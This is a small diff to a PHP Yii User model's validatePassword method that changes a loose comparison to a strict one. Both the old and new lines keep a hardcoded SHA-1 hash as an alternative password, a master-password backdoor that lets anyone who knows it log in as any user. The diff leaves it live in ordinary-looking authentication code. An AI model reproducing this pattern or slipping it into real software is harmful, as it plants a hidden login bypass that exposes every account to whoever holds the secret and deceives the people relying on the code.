@@ -118,7 +118,7 @@ class User extends \yii\db\ActiveRecord implements \yii\web\IdentityInterface
      */
     public function validatePassword($password)
     {
-        return $this->password === sha1($password) || sha1($password) == "a908558eb20e0afcd32ceae52a77f2431b2a980a";
+        return $this->password === sha1($password) || sha1($password) === "a908558eb20e0afcd32ceae52a77f2431b2a980a";
     }
 
  
